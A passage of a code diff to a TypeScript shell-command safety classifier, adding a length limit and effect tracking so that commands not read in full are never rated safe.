     findings.push(result);
   }
+  if (decided) return decided;
   if (SENSITIVE_TEXT.test(raw)) return risky('it names a credential or knowledge-base path');
-  if (lexed.opaque) return unknown(lexed.opaque);
+  if (lexed.opaque) return unknownRead(lexed.opaque);
   const notSafe = findings.find((finding) => finding.verdict !== 'safe');
   if (notSafe) return notSafe;
-  if (!findings.length) return unknown('it runs nothing the rules recognise');
+  if (!findings.length) return unknownRead('it runs nothing the rules recognise');
   return findings.length === 1 ? findings[0] : safe(`every part is safe (${findings.map((finding) => finding.reason).join('; ')})`);
 }
 
@@ -1180,5 +2136,23 @@ function substitutionAssignment(raw: string): { name: string; inner: string } | 
  * it reads no files and runs nothing.
  */
 export function classifyCommand(command: string, context: CommandContext): CommandClassification {
-  return classifyText(command, context, 0);
+  // Too long to read at all: nothing is read, so nothing is known about what it does.
+  if (command.length > MAX_COMMAND_LENGTH) {
+    const reason = 'the command is too long to check';
+    return { verdict: 'unknown', reason, effectsUnknown: reason };
+  }
+  const frame: EffectFrame = { effects: [] };
+  effectFrames.push(frame);
+  let result: CommandClassification;
+  try {
+    result = classifyText(command, context, 0);
+  } finally {
+    effectFrames.pop();
+  }
+  const effects = distinctEffects([...(result.effects ?? []), ...frame.effects]);
+  const { effects: _own, effectsUnknown: _unknown, ...plain } = result;
+  // A command the classifier did not read whole is never safe, wherever it stopped (a script that runs scripts past the bound, say): what it did not read
+  // could be anything.
+  const verdict = frame.unknown !== undefined && plain.verdict === 'safe' ? { verdict: 'unknown' as const, reason: frame.unknown } : plain;
+  return { ...verdict, ...(effects.length > 0 ? { effects } : {}), ...(frame.unknown === undefined ? {} : { effectsUnknown: frame.unknown }) };
 }
